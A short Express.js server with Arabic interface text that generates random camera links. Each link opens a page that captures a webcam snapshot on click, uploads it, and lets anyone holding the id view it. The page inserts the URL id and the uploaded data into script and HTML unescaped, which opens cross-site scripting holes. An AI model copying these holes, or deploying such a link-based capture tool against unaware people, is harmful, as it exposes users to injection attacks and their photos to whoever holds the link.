const express = require('express');
const app = express();
app.use(express.json({ limit: '5mb' }));

const PORT = process.env.PORT || 3000;

// لتخزين الصور مؤقتًا حسب الرابط
const images = {};

// صفحة رئيسية تولد الروابط
app.get('/', (req, res) => {
  res.send(`
    <html>
    <head>
      <title>مولد روابط الكاميرا</title>
      <style>
        body { font-family: Arial; text-align: center; margin-top: 50px; }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
        a { display: block; margin-top: 20px; font-size: 18px; color: blue; text-decoration: none; }
      </style>
    </head>
    <body>
      <h1>اضغط الزر لتوليد رابط جديد</h1>
      <button onclick="generate()">توليد رابط</button>
      <div id="links"></div>
      <script>
        function generate() {
          const id = Math.floor(Math.random()*100000);
          const link = '/camera/' + id;
          const a = document.createElement('a');
          a.href = link;
          a.textContent = 'رابط الكاميرا: ' + link;
          document.getElementById('links').appendChild(a);
        }
      </script>
    </body>
    </html>
  `);
});

// صفحة الكاميرا لكل رابط
app.get('/camera/:id', (req, res) => {
  res.send(`
    <html>
    <head>
      <title>كاميرا</title>
      <style>
        body { font-family: Arial; text-align:center; margin-top:50px; }
        video, img { max-width:100%; margin-top:20px; }
        button { padding:10px 20px; font-size:16px; cursor:pointer; margin:10px; }
      </style>
    </head>
    <body>
      <h1>التقط صورتك</h1>
      <video id="video" autoplay playsinline style="display:none;"></video>
      <button id="capture" style="display:none;">التقاط صورة</button>
      <img id="photo" alt="صورتك ستظهر هنا">
      <script>
        const video = document.getElementById('video');
        const captureBtn = document.getElementById('capture');
        const photo = document.getElementById('photo');
        const id = '${req.params.id}';

        navigator.mediaDevices.getUserMedia({ video:true })
          .then(stream => {
            video.srcObject = stream;
            video.style.display = 'block';
            captureBtn.style.display = 'inline-block';
          })
          .catch(err => alert('تعذر الوصول إلى الكاميرا: ' + err.message));

        captureBtn.addEventListener('click', () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL('image/png');

          fetch('/upload/' + id, {
            method:'POST',
            headers:{ 'Content-Type':'application/json' },
            body: JSON.stringify({ image: imageData })
          }).then(res=>res.json())
            .then(data=>{
              if(data.success){
                photo.src = imageData;
                video.srcObject.getTracks().forEach(t=>t.stop());
                video.style.display='none';
                captureBtn.style.display='none';
              }
            });
        });
      </script>
    </body>
    </html>
  `);
});

// استقبال الصورة وحفظها
app.post('/upload/:id', (req, res) => {
  const { id } = req.params;
  const { image } = req.body;
  images[id] = image;
  res.json({ success: true });
});

// عرض الصورة إذا أردت
app.get('/photo/:id', (req, res) => {
  const { id } = req.params;
  const img = images[id];
  if(!img) return res.send('لا توجد صورة لهذا الرابط');
  res.send(`<h1>صورتك</h1><img src="${img}" style="max-width:100%">`);
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
